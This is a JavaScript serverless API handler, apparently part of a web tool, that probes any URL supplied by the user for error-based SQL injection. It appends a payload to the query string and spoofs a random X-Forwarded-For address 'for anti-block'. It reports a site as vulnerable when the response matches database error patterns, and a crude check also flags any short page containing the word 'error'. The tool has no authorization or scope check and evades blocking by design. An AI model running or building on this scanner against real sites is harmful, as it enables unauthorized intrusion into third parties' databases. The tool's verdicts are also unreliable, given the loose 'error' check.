// /api/test.js - Test SQLi Vulnerability with ' payload
export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }
    
    const { url, payload, antiBlock } = req.body;
    
    // Random IP untuk anti block
    const randomIP = `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
    
    // Parse URL to inject payload
    let testUrl = url;
    if(url.includes('=')) {
        testUrl = url + payload;
    } else {
        testUrl = url + "?id=1" + payload;
    }
    
    // SQL Error patterns
    const errorPatterns = [
        /you have an error in your sql syntax/i,
        /warning.*mysql/i,
        /unclosed quotation mark/i,
        /microsoft ole db/i,
        /odbcdriver/i,
        /sqlite/i,
        /postgresql/i,
        /mysql_fetch/i,
        /num_rows/i,
        /query failed/i,
        /database error/i,
        /sql syntax/i,
        /incorrect syntax near/i,
        /division by zero/i
    ];
    
    try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 10000);
        
        const response = await fetch(testUrl, {
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'X-Forwarded-For': randomIP,
                'Accept': 'text/html,application/xhtml+xml'
            },
            signal: controller.signal
        }).catch(() => null);
        
        clearTimeout(timeoutId);
        
        if(!response) {
            return res.json({ vulnerable: false, error: 'No response' });
        }
        
        const text = await response.text();
        let vulnerable = false;
        let matchedPattern = null;
        
        for(let pattern of errorPatterns) {
            if(pattern.test(text)) {
                vulnerable = true;
                matchedPattern = pattern.toString();
                break;
            }
        }
        
        // Check for 'error' in response
        if(text.toLowerCase().includes('error') && text.length < 5000) {
            vulnerable = true;
        }
        
        // Extract column info if possible
        let column = null;
        const columnMatch = text.match(/column.*?(\d+)/i);
        if(columnMatch) column = columnMatch[1];
        
        res.json({
            vulnerable: vulnerable,
            url: testUrl,
            payload: payload,
            error_type: matchedPattern ? 'SQL Syntax Error Detected' : (vulnerable ? 'Possible SQL Error' : null),
            column: column,
            response_length: text.length
        });
        
    } catch(error) {
        res.json({
            vulnerable: false,
            error: error.message,
            url: testUrl
        });
    }
}
